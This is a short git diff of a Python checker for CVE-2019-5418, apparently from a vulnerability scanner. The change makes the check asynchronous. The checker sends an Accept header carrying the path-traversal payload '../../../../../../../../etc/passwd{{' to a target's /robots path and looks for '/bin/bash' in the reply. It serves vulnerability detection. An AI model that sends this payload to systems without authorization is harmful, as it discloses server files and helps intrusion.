@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class CVE_2019_5418_BaseVerify:
     def __init__(self, url):
@@ -20,7 +20,7 @@ class CVE_2019_5418_BaseVerify:
             'Accept': '../../../../../../../../etc/passwd{{'
         }
 
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -31,14 +31,11 @@ class CVE_2019_5418_BaseVerify:
         """
 
         try:
-            check_req = request.get(self.url + '/robots', headers = self.headers)
-            if check_req.status_code == 200 and '/bin/bash' in check_req.text:
+            check_req = await request.get(self.url + '/robots', headers = self.headers)
+            if check_req.status == 200 and '/bin/bash' in await check_req.text():
                 return True
-            else:
-                return False
         except Exception as e:
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
